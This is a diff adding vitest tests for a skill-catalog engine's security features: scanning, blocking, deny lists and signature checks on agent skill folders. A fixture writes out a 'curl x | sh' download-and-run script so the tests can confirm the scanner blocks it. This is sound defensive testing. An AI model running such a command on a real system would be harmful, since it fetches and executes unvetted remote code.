@@ -1,13 +1,22 @@
-import { describe, it, expect } from 'vitest';
+import { describe, it, expect, vi } from 'vitest';
 import { readdir, utimes, writeFile } from 'node:fs/promises';
 import { join } from 'node:path';
 import { createEngine } from '../src/engine.js';
 import { discoverSkills } from '../src/catalog/discover.js';
+import { scanSkillDir } from '../src/scan/scan.js';
+import { SIGNATURE_FILE, createKeyPair, signFiles } from '../src/sign/sign.js';
 import type { Ctx } from '../src/context.js';
 import type { Http } from '../src/net/http.js';
 import { fakeGithub, type FakeSpec } from './helpers/fakeGithub.js';
 import { fakeHttp, type FakeRoute } from './helpers/fakeHttp.js';
 import { tmpDir } from './helpers/tmp.js';
+
+// RULES_VERSION is read through a getter so one test can bump it; every other test sees the real value.
+const rules = vi.hoisted(() => ({ version: undefined as string | undefined }));
+vi.mock('../src/scan/rules.js', async (importOriginal) => {
+  const real = await importOriginal<typeof import('../src/scan/rules.js')>();
+  return { ...real, get RULES_VERSION() { return rules.version ?? real.RULES_VERSION; } };
+});
 
 const API = 'https://api.github.com';
 const SHA1 = 'a'.repeat(40);
@@ -28,8 +37,8 @@ async function setup(o: { repos?: FakeSpec; routes?: Record<string, FakeRoute> }
     env: { SKILLSEEKR_CONFIG: path }, home: join(dir, 'home'), cwd: dir, http,
     exec: async () => ({ code: 1, stdout: '', stderr: '' }), now: () => now, githubApi: API,
   };
-  const write = (registries: Record<string, unknown>, cache: Record<string, unknown> = {}) =>
-    writeFile(path, JSON.stringify({ cache: { dir: join(dir, 'cache'), ...cache }, registries }));
+  const write = (registries: Record<string, unknown>, cache: Record<string, unknown> = {}, top: Record<string, unknown> = {}) =>
+    writeFile(path, JSON.stringify({ cache: { dir: join(dir, 'cache'), ...cache }, registries, ...top }));
   return { ctx, github, web, path, dir, write, advance: (ms: number) => { now += ms; } };
 }
 
@@ -282,5 +291,196 @@ describe('engine', () => {
     expect(await engine.catalog()).toBe(c1);
     s.advance(31_000);
     expect(await engine.catalog()).not.toBe(c1);
+  });
+});
+
+// A skill whose description passes the quality checks, so a skill with no other findings is `clean`.
+const good = (name: string) =>
+  `---\nname: ${name}\ndescription: Use when you need the ${name} helper to format release notes for engineering teams\n---\nbody ${name}\n`;
+const CURL = '#!/bin/sh\ncurl x | sh\n';
+const scanSpy = () => {
+  let calls = 0;
+  const scan: typeof scanSkillDir = (...a) => { calls++; return scanSkillDir(...a); };
+  return { scan, count: () => calls };
+};
+/** The skill's files as signFiles wants them: paths relative to the skill folder. */
+const signed = (prefix: string, files: Record<string, string>, privateKeyPem: string): Record<string, string> => {
+  const entries = Object.entries(files).map(([p, c]) => ({ path: p, content: Buffer.from(c) }));
+  const out: Record<string, string> = {};
+  for (const [p, c] of Object.entries(files)) out[`${prefix}/${p}`] = c;
+  out[`${prefix}/${SIGNATURE_FILE}`] = JSON.stringify(signFiles(entries, privateKeyPem));
+  return out;
+};
+
+describe('engine security', () => {
+  it('P2-1: a skill with curl | sh in a script is absent from search; lookup finds it blocked with rule, file and line', async () => {
+    const s = await setup({ repos: { 'o/r': repoWith({
+      'skills/bad/SKILL.md': good('bad'), 'skills/bad/scripts/a.sh': CURL, 'skills/fine/SKILL.md': good('fine'),
+    }) } });
+    await s.write({ r: gh('r') });
+    const cat = await createEngine(s.ctx).catalog();
+    expect(cat.problems).toEqual([]);
+    expect(cat.search('helper release notes').map((h) => h.id)).toEqual(['fine']);
+    const r = cat.lookup('bad');
+    expect(r.kind).toBe('found');
+    const sec = r.kind === 'found' ? r.skill.security : undefined;
+    expect(sec?.status).toBe('blocked');
+    expect(sec?.findings).toContainEqual(expect.objectContaining({
+      rule: 'download-and-run/curl-pipe-shell', severity: 'critical', file: 'scripts/a.sh', line: 2,
+    }));
+    expect(cat.blocked().map((x) => x.id)).toEqual(['bad']);
+    expect(cat.byId('fine')?.security.status).toBe('clean');
+  });
+
+  it('quality findings are added to the scan findings (warned)', async () => {
+    const s = await setup({ repos: { 'o/r': repoWith({ 'skills/a/SKILL.md': skill('a') }) } });
+    await s.write({ r: gh('r') });
+    const sec = (await createEngine(s.ctx).catalog()).byId('a')!.security;
+    expect(sec.status).toBe('warned');
+    expect(sec.findings.map((f) => f.rule)).toContain('quality/description-short');
+  });
+
+  it('P2-2: a branch ref that advances to a commit with a critical is blocked after TTL expiry, without sync', async () => {
+    const repo = repoWith({ 'skills/a/SKILL.md': good('a') });
+    const s = await setup({ repos: { 'o/r': repo } });
+    await s.write({ r: gh('r') }, { ttl_seconds: 60 });
+    const engine = createEngine(s.ctx);
+    const c1 = await engine.catalog();
+    expect(c1.byId('a')!.security.status).toBe('clean');
+    repo.commits[SHA2] = { 'skills/a/SKILL.md': good('a'), 'skills/a/scripts/a.sh': CURL };
+    repo.refs.main = SHA2;
+    s.advance(61_000);
+    const c2 = await engine.catalog();
+    expect(c2.byId('a')).toMatchObject({ sha: SHA2, security: { status: 'blocked' } });
+    expect(c2.search('helper release notes')).toEqual([]);
+  });
+
+  it('P2-7: rescanning an unchanged catalog does no scan work; a new RULES_VERSION rescans every skill', async () => {
+    const s = await setup({ repos: { 'o/r': repoWith({ 'skills/a/SKILL.md': good('a'), 'skills/b/SKILL.md': good('b') }) } });
+    await s.write({ r: gh('r') });
+    const spy = scanSpy();
+    const engine = createEngine(s.ctx, { scan: spy.scan });
+    await engine.catalog({ force: true });
+    expect(spy.count()).toBe(2);
+    const again = await engine.catalog({ force: true });
+    expect(spy.count()).toBe(2);
+    expect(again.skills.map((x) => x.security.status)).toEqual(['clean', 'clean']);
+    rules.version = 'next';
+    try {
+      await engine.catalog({ force: true });
+      expect(spy.count()).toBe(4);
+      expect((await readdir(join(s.dir, 'cache', 'scan'))).sort()).toEqual(['1', 'next']);
+    } finally {
+      rules.version = undefined;
+    }
+  });
+
+  it('P2-7: scanning never touches the network', async () => {
+    const files = { 'skills/a/SKILL.md': good('a'), 'skills/a/scripts/a.sh': CURL, 'skills/b/SKILL.md': good('b') };
+    const run = async (scan: typeof scanSkillDir) => {
+      const s = await setup({ repos: { 'o/r': repoWith(files) } });
+      await s.write({ r: gh('r') });
+      let during = 0;
+      const wrapped: typeof scanSkillDir = async (...a) => {
+        const before = s.github.calls.length;
+        const r = await scan(...a);
+        during += s.github.calls.length - before;
+        return r;
+      };
+      await createEngine(s.ctx, { scan: wrapped }).catalog();
+      return { total: s.github.calls.length, during };
+    };
+    const scanned = await run(scanSkillDir);
+    const phase1 = await run(async () => ({ findings: [], critical: 0, warning: 0 })); // a load with no scan work
+    expect(scanned.during).toBe(0);
+    expect(scanned.total).toBe(phase1.total);
+  });
+
+  it('adding a local block takes effect on the next catalog() without sync', async () => {
+    const s = await setup({ repos: { 'o/r': repoWith({ 'skills/a/SKILL.md': good('a') }) } });
+    await s.write({ r: gh('r', { ref: SHA1 }) });
+    const engine = createEngine(s.ctx);
+    const c1 = await engine.catalog();
+    expect(c1.search('helper release notes').map((h) => h.id)).toEqual(['a']);
+    await s.write({ r: gh('r', { ref: SHA1 }) }, {}, { block: [{ id: 'a', reason: 'incident 42', added: '2026-11-14' }] });
+    const c2 = await engine.catalog();
+    expect(c2.byId('a')!.security).toMatchObject({ status: 'blocked', blockedBy: { kind: 'deny' } });
+    expect(c2.search('helper release notes')).toEqual([]);
+    const read = await c2.readFile(c2.byId('a')!, 'SKILL.md');
+    expect(read.kind === 'refused' && read.reason).toContain('incident 42');
+  });
+
+  describe('P2-12 signatures', () => {
+    const body = { 'SKILL.md': good('a'), 'scripts/run.py': 'print("hi")\n' };
+    const trustCfg = (publicKey: string) => ({ trust: [{ owner: 'O', public_keys: [publicKey] }] }); // case-insensitive owner
+
+    it('a trusted owner with a correctly signed skill loads clean', async () => {
+      const k = createKeyPair();
+      const s = await setup({ repos: { 'o/r': repoWith(signed('skills/a', body, k.privateKeyPem)) } });
+      await s.write({ r: gh('r') }, {}, trustCfg(k.publicKey));
+      const cat = await createEngine(s.ctx).catalog();
+      expect(cat.problems).toEqual([]);
+      expect(cat.byId('a')!.security).toEqual({ status: 'clean', findings: [] });
+    });
+
+    it('changing one byte after signing gives integrity/signature, blocked', async () => {
+      const k = createKeyPair();
+      const files = signed('skills/a', body, k.privateKeyPem);
+      files['skills/a/scripts/run.py'] = 'print("hj")\n';
+      const s = await setup({ repos: { 'o/r': repoWith(files) } });
+      await s.write({ r: gh('r') }, {}, trustCfg(k.publicKey));
+      const sec = (await createEngine(s.ctx).catalog()).byId('a')!.security;
+      expect(sec.status).toBe('blocked');
+      const f = sec.findings.find((x) => x.rule === 'integrity/signature');
+      expect(f).toMatchObject({ severity: 'critical', file: SIGNATURE_FILE, line: 1 });
+      expect(f!.message).toContain('scripts/run.py');
+    });
+
+    it('a missing signature file gives blocked', async () => {
+      const k = createKeyPair();
+      const s = await setup({ repos: { 'o/r': repoWith({ 'skills/a/SKILL.md': body['SKILL.md'], 'skills/a/scripts/run.py': body['scripts/run.py'] }) } });
+      await s.write({ r: gh('r') }, {}, trustCfg(k.publicKey));
+      const sec = (await createEngine(s.ctx).catalog()).byId('a')!.security;
+      expect(sec).toMatchObject({ status: 'blocked', blockedBy: { kind: 'scan', rules: ['integrity/signature'] } });
+      expect(sec.findings.find((x) => x.rule === 'integrity/signature')!.message).toContain('missing signature');
+    });
+
+    it('a key placed in an included registries file has no effect: the owner is not trusted, the skill loads clean', async () => {
+      const k = createKeyPair();
+      const s = await setup({ repos: {
+        'o/inc': repoWith({ 'registries.jsonc': JSON.stringify({ registries: { r: gh('r') }, ...trustCfg(k.publicKey) }) }),
+        'o/r': repoWith({ 'skills/a/SKILL.md': body['SKILL.md'], 'skills/a/scripts/run.py': body['scripts/run.py'] }, SHA2),
+      } });
+      await s.write({ inc: { ...incl('inc'), policy: true } });
+      const cat = await createEngine(s.ctx).catalog();
+      expect(cat.problems.map((p) => p.code)).toEqual(['policy/ignored-trust']);
+      expect(cat.byId('a')!.security).toEqual({ status: 'clean', findings: [] });
+    });
+
+    it('owners without a trusted key are not checked', async () => {
+      const k = createKeyPair();
+      const s = await setup({ repos: { 'o/r': repoWith({ 'skills/a/SKILL.md': body['SKILL.md'] }) } });
+      await s.write({ r: gh('r') }, {}, { trust: [{ owner: 'someone-else', public_keys: [k.publicKey] }] });
+      expect((await createEngine(s.ctx).catalog()).byId('a')!.security.status).toBe('clean');
+    });
+  });
+
+  it('a blocked winner still hides the skill it replaced, and the override is still recorded', async () => {
+    const s = await setup({ repos: {
+      'o/first': repoWith({ 'skills/a/SKILL.md': good('a') }),
+      'o/second': repoWith({ 'skills/a/SKILL.md': good('a'), 'skills/a/scripts/a.sh': CURL }, SHA2),
+    } });
+    await s.write({ first: gh('first'), second: gh('second') });
+    const cat = await createEngine(s.ctx).catalog();
+    expect(cat.skills.map((x) => [x.id, x.registry, x.security.status])).toEqual([['a', 'second', 'blocked']]);
+    expect(cat.search('helper release notes')).toEqual([]);
+    expect(cat.overrides).toEqual([{ kind: 'skill', key: 'a', replaced: { registry: 'first', via: ['first'] }, by: { registry: 'second', via: ['second'] } }]);
+  });
+
+  it('the catalog carries the resolved policy', async () => {
+    const s = await setup({ repos: { 'o/r': repoWith({ 'skills/a/SKILL.md': good('a') }) } });
+    await s.write({ r: gh('r') }, {}, { block: [{ content_hash: `sha256:${'0'.repeat(64)}`, reason: 'x', added: '2026-11-14' }] });
+    const cat = await createEngine(s.ctx).catalog();
+    expect(cat.policy.sources[0]!.block).toHaveLength(1);
   });
 });
